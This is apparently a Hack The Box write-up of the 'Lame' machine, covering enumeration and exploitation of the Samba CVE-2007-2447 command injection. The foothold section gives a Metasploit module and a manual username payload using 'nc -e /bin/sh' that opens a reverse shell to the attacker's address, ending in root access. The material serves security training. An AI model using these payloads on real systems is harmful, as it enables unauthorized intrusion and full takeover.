**Machine:** Lame | **OS:** Linux | **Platform:** Hack The Box | **Difficulty:** Easy

Lame is one of the original HTB machines — a Linux box running a vulnerable version of Samba that allows unauthenticated remote code execution directly as root. Classic stuff.

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oN lame.nmap 10.10.10.3
```

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
```

The standout finding is **Samba 3.0.20** on port 445. This version is vulnerable to CVE-2007-2447, a command injection in the username field during authentication.

### Service Enumeration

```bash
smbclient -L //10.10.10.3 -N
```

```
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service
        ADMIN$          IPC       IPC Service (lame server)
```

The `tmp` share is accessible without authentication. Suspicious.

## Foothold

### Exploitation — CVE-2007-2447

The Samba `username map script` option allows shell meta-characters in usernames to be passed directly to `/bin/sh`. We can exploit this to get a shell.

**Using Metasploit:**

```bash
msfconsole -q
use exploit/multi/samba/usermap_script
set RHOST 10.10.10.3
set LHOST 10.10.14.5
set LPORT 4444
run
```

```
[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] Command shell session 1 opened
```

**Manual exploitation:**

```bash
smbclient //10.10.10.3/tmp -N --option='client min protocol=NT1'

# In the smb prompt:
logon "/=`nohup nc -e /bin/sh 10.10.14.5 4444`"
```

On our listener:

```bash
nc -lvnp 4444
# Received shell!
id
# uid=0(root) gid=0(root) groups=0(root)
```

We land directly as **root** — no privilege escalation needed.

## Lessons Learned

1. **Always patch your services** — Samba 3.0.20 was known-vulnerable in 2007, yet still deployed.
2. **SMB enumeration is critical** during initial recon — smbclient and enum4linux reveal a lot.
3. **Check for anonymous/guest access** on file shares — the `tmp` share gave us useful context.
4. **CVE-2007-2447** is a good reminder that command injection vulnerabilities can exist in unexpected places (like authentication flows).
